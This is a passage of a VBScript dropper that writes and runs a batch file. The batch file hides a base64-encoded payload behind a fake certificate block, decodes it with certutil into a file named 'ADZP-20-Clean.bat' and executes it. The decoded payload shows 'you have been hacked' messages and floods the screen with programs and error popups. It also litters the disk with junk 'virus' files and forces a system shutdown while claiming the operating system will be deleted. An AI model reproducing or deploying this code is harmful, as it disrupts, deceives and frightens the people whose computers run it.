ar.writeline " echo ICogVmlydXMgRGV0ZWN0YWRvDQptc2cgKiBWaXJ1cyBEZXRlY3RhZG8NCm1zZyAq "
ar.writeline " echo IEhhcyBTaWRvIEhhY2tlYWRvIQ0Kc3RhcnQgbm90ZXBhZA0Kc3RhcnQgY2FsYw0K "
ar.writeline " echo c3RhcnQgZXhwbG9yZXIuZXhlDQpzdGFydCBtc3BhaW50LmV4ZQ0Kc3RhcnQgbm90 "
ar.writeline " echo ZXBhZA0Kc3RhcnQgY2FsYw0Kc3RhcnQgZXhwbG9yZXIuZXhlDQpzdGFydCBtc3Bh "
ar.writeline " echo aW50LmV4ZQ0Kc3RhcnQgbm90ZXBhZA0Kc3RhcnQgY2FsYw0Kc3RhcnQgZXhwbG9y "
ar.writeline " echo ZXIuZXhlDQpzdGFydCBtc3BhaW50LmV4ZQ0Kc3RhcnQgbm90ZXBhZA0Kc3RhcnQg "
ar.writeline " echo Y2FsYw0Kc3RhcnQgZXhwbG9yZXIuZXhlDQpzdGFydCBtc3BhaW50LmV4ZQ0Kc3Rh "
ar.writeline " echo cnQgbm90ZXBhZA0Kc3RhcnQgY2FsYw0Kc3RhcnQgZXhwbG9yZXIuZXhlDQpzdGFy "
ar.writeline " echo dCBtc3BhaW50LmV4ZQ0Kc3RhcnQgbm90ZXBhZA0Kc3RhcnQgY2FsYw0Kc3RhcnQg "
ar.writeline " echo ZXhwbG9yZXIuZXhlDQpzdGFydCBtc3BhaW50LmV4ZQ0Kc3RhcnQgbm90ZXBhZA0K "
ar.writeline " echo c3RhcnQgY2FsYw0Kc3RhcnQgZXhwbG9yZXIuZXhlDQpzdGFydCBtc3BhaW50LmV4 "
ar.writeline " echo ZQ0Kc3RhcnQgbm90ZXBhZA0Kc3RhcnQgY2FsYw0Kc3RhcnQgZXhwbG9yZXIuZXhl "
ar.writeline " echo DQpzdGFydCBtc3BhaW50LmV4ZQ0Kc3RhcnQgbm90ZXBhZA0Kc3RhcnQgY2FsYw0K "
ar.writeline " echo c3RhcnQgZXhwbG9yZXIuZXhlDQpzdGFydCBtc3BhaW50LmV4ZQ0Kc3RhcnQgbm90 "
ar.writeline " echo ZXBhZA0Kc3RhcnQgY2FsYw0Kc3RhcnQgZXhwbG9yZXIuZXhlDQpzdGFydCBtc3Bh "
ar.writeline " echo aW50LmV4ZQ0KZWNobyBvZmY+PnZpcnVzLmV4ZQ0KZWNobyBvZmY+PnZpcnVzLmRs "
ar.writeline " echo bA0KZWNobyBvZmY+PnZpcnVzLmNvbQ0KZWNobyBvZmY+PnZpcnVzLmluaQ0KZWNo "
ar.writeline " echo byBvZmY+PnZpcnVzLmluZg0KZWNobyBvZmY+PnZpcnVzLnN5cw0KZWNobyBvZmY+ "
ar.writeline " echo PnZpcnVzLnJlZw0KZWNobyBvZmY+PnZpcnVzLmFuaQ0KZWNobyBvZmY+PnZpcnVz "
ar.writeline " echo LnJhcg0KZWNobyBvZmY+PnZpcnVzLnBhbA0KZWNobyBvZmY+PnZpcnVzLmJpbg0K "
ar.writeline " echo ZWNobyBvZmY+PnZpcnVzLmNtZA0KZWNobyBvZmY+PnZpcnVzLmphcg0KZWNobyBv "
ar.writeline " echo ZmY+PnZpcnVzLmNoaw0KZWNobyBvZmY+PnZpcnVzLmRiDQplY2hvIG9mZj4+dmly "
ar.writeline " echo dXMub2N4DQplY2hvIG9mZj4+dmlydXMubWFuaWZlc3QNCmVjaG8gb2ZmPj52aXJ1 "
ar.writeline " echo cy5sb2cNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVy "
ar.writeline " echo LmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNh "
ar.writeline " echo bGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0 "
ar.writeline " echo IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQg "
ar.writeline " echo bXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4 "
ar.writeline " echo cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0 "
ar.writeline " echo YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUN "
ar.writeline " echo CnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0K "
ar.writeline " echo c3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0 "
ar.writeline " echo YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVw "
ar.writeline " echo YWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWlu "
ar.writeline " echo dC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVy "
ar.writeline " echo LmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNh "
ar.writeline " echo bGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCmVjaG8g "
ar.writeline " echo b2ZmPj52aXJ1cy5kYXQNCmVjaG8gb2ZmPj52aXJ1cy5jdXINCmVjaG8gb2ZmPj52 "
ar.writeline " echo aXJ1cy4zODYNCmVjaG8gb2ZmPj52aXJ1cy4zMjMNCmVjaG8gb2ZmPj52aXJ1cy5z "
ar.writeline " echo Y3INCmVjaG8gb2ZmPj52aXJ1cy5hY20NCmVjaG8gb2ZmPj52aXJ1cy5jcGwNCmVj "
ar.writeline " echo aG8gb2ZmPj52aXJ1cy5obHANCmVjaG8gb2ZmPj52aXJ1cy5qcGcNCmVjaG8gb2Zm "
ar.writeline " echo Pj52aXJ1cy5tcGcNCmVjaG8gb2ZmPj52aXJ1cy5odG1sDQplY2hvIG9mZj4+dmly "
ar.writeline " echo dXMudmJzDQplY2hvIG9mZj4+dmlydXMuZHJ2DQplY2hvIG9mZj4+dmlydXMud3No "
ar.writeline " echo DQplY2hvIG9mZj4+dmlydXMucmF0DQplY2hvIG9mZj4+dmlydXMuY2VyDQplY2hv "
ar.writeline " echo IG9mZj4+dmlydXMubXNjDQplY2hvIG9mZj4+dmlydXMuZGINCnN0YXJ0IG5vdGVw "
ar.writeline " echo YWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWlu "
ar.writeline " echo dC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVy "
ar.writeline " echo LmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNh "
ar.writeline " echo bGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0 "
ar.writeline " echo IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQg "
ar.writeline " echo bXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4 "
ar.writeline " echo cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0 "
ar.writeline " echo YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUN "
ar.writeline " echo CnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0K "
ar.writeline " echo c3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0 "
ar.writeline " echo YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IG5vdGVw "
ar.writeline " echo YWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVyLmV4ZQ0Kc3RhcnQgbXNwYWlu "
ar.writeline " echo dC5leGUNCnN0YXJ0IG5vdGVwYWQNCnN0YXJ0IGNhbGMNCnN0YXJ0IGV4cGxvcmVy "
ar.writeline " echo LmV4ZQ0Kc3RhcnQgbXNwYWludC5leGUNCnN0YXJ0IEVycm9yQ3JpdGljby52YnMN "
ar.writeline " echo CnN0YXJ0IEFkdmVydGVuY2lhLnZicw0Kc3RhcnQgRXJyb3JDcml0aWNvLnZicw0K "
ar.writeline " echo c3RhcnQgQWR2ZXJ0ZW5jaWEudmJzDQpzdGFydCBFcnJvckNyaXRpY28udmJzDQpz "
ar.writeline " echo dGFydCBBZHZlcnRlbmNpYS52YnMNCnN0YXJ0IEVycm9yQ3JpdGljby52YnMNCnN0 "
ar.writeline " echo YXJ0IEFkdmVydGVuY2lhLnZicw0Kc3RhcnQgRXJyb3JDcml0aWNvLnZicw0Kc3Rh "
ar.writeline " echo cnQgQWR2ZXJ0ZW5jaWEudmJzDQpzaHV0ZG93biAtcyAtdCAxNSAtYyAiQURaUCAy "
ar.writeline " echo MCBDb21wbGV4IGVzdGEgYSBwdW50byBkZSBlbGltaW5hciBlbCBTaXN0ZW1hIE9w "
ar.writeline " echo ZXJhdGl2byINCnN0YXJ0IEluZm9ybWFjaW9uLnZicw0Kc3RhcnQgRXJyb3JDcml0 "
ar.writeline " echo aWNvLnZicw0Kc3RhcnQgQWR2ZXJ0ZW5jaWEudmJzDQpzdGFydCBFcnJvckNyaXRp "
ar.writeline " echo Y28udmJzDQpzdGFydCBBZHZlcnRlbmNpYS52YnMNCnN0YXJ0IEVycm9yQ3JpdGlj "
ar.writeline " echo by52YnMNCnN0YXJ0IEFkdmVydGVuY2lhLnZicw0Kc3RhcnQgSW5mb3JtYWNpb24u "
ar.writeline " echo dmJzDQpzdGFydCBFcnJvckNyaXRpY28udmJzDQpzdGFydCBBZHZlcnRlbmNpYS52 "
ar.writeline " echo YnMNCnN0YXJ0IEVycm9yQ3JpdGljby52YnMNCnN0YXJ0IEFkdmVydGVuY2lhLnZi "
ar.writeline " echo cw0Kc3RhcnQgRXJyb3JDcml0aWNvLnZicw0Kc3RhcnQgQWR2ZXJ0ZW5jaWEudmJz "
ar.writeline " echo DQpnb3RvIE1lbnU= "
ar.writeline " echo -----END CERTIFICATE----- "
ar.writeline " )>>00000.bin "
ar.writeline " certutil -decode 00000.bin ADZP-20-Clean.bat >NUL 2>NUL "
ar.writeline " move ADZP-20-Clean.bat %v% >NUL 2>NUL "
ar.writeline " del /f /q /s 00000.bin >NUL 2>NUL "
ar.writeline " call %v% "
ar.writeline " exit "
ar.close
b.run tempFolder & "Shingapi.clean.sk.bat", 1, true